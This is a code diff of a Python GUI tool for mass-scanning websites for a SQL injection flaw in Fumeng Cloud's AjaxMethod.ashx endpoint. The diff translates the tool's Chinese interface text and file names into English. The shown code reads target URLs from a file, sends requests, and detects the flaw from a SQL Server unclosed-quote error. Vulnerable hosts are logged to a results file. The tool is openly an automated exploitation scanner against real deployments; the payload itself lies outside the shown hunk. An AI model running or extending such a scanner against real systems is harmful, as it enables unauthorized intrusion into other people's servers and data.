@@ -11,25 +11,25 @@ def fumengyun_sql_exp(url):
     try:
         res = requests.get(url, verify=False, timeout=3)
         if "字符串 'Y'' 后的引号不完整。" in res.text:
-            fumengyun_sql_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
+            fumengyun_sql_text.insert(END,"[! ! ! ! ! ! ] Vulnerable url:" + url + "\n")
             fumengyun_sql_text.see(END)
-            with open ("存在孚盟云 AjaxMethod.ashx SQL注入漏洞的url.txt", 'a') as f:
+            with open ("[exists]fumengyun_sql_injection_url.txt", 'a') as f:
                 f.write(url + "\n")
         else:
-            fumengyun_sql_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
+            fumengyun_sql_text.insert(END,"[×]URL without vulnerability:" + url + "\n")
             fumengyun_sql_text.see(END)
     except Exception as err:
-        fumengyun_sql_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
+        fumengyun_sql_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
         fumengyun_sql_text.see(END)
 def get_fumengyun_sql_addr():
-    with open("修正后的url.txt","r") as f:
+    with open("corrected url.txt","r") as f:
         for address in f.readlines():
             address = address.strip()
             yield address
 def fumengyun_sql_gui():
     fumengyun_sql = Toplevel()
     fumengyun_sql.geometry("1035x455")
-    fumengyun_sql.title("孚盟云 AjaxMethod.ashx SQL注入漏洞一把梭")
+    fumengyun_sql.title("Fumeng Cloud AjaxMethod.ashx SQLinjection [auto-muti-exp]")
     fumengyun_sql.resizable(0, 0)
     logo = PhotoImage(file="./logo.ico")
     fumengyun_sql.tk.call('wm', 'iconphoto', fumengyun_sql._w, logo)
